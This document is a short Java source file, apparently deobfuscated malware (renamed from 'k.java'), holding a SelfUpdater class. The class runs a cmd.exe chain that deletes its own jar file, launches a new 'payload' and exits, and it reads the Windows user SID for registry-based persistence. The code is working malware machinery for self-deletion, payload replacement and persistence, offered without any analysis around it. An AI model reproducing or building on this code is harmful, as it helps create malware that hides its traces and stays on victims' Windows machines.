import com.sun.jna.platform.win32.Advapi32Util;
import java.io.File;

/**
 * Cleaned SelfUpdater (formerly k.java)
 * Handles self-deletion, updates to newer versions, and persistence setup.
 * It identifies the current user's SID to calculate registry paths.
 */
public class SelfUpdater {

    public static void executeUpdate(String newPayloadPath) {
        try {
            String currentPath = getCurrentJarPath();
            String currentCommand = getCurrentCommand();
            
            if (currentPath == null || currentCommand == null) return;

            // Build a CMD command to delete the current file and start the new one
            // Example: cmd.exe /c timeout 3 & del "current.jar" & start "new.exe"
            String[] updateCmd = {
                "cmd.exe", "/c", "timeout", "3", "&", 
                "del", "\"" + currentPath + "\"", "&", 
                "start", "\"" + newPayloadPath + "\""
            };

            new ProcessBuilder(updateCmd).start();
            
            // Immediately exit to allow the CMD script to delete this process
            System.exit(0);
        } catch (Exception ignored) {}
    }

    private static String getCurrentJarPath() {
        try {
            return new File(SelfUpdater.class.getProtectionDomain()
                    .getCodeSource().getLocation().toURI()).getAbsolutePath();
        } catch (Exception e) {
            return null;
        }
    }

    private static String getCurrentCommand() {
        return ProcessHandle.current().info().command().orElse(null);
    }

    public static String getUserSID() {
        try {
            // Uses Advapi32 to get the SID of the current Windows user
            return Advapi32Util.getUserAccount().sidString;
        } catch (Exception e) {
            return "";
        }
    }
}
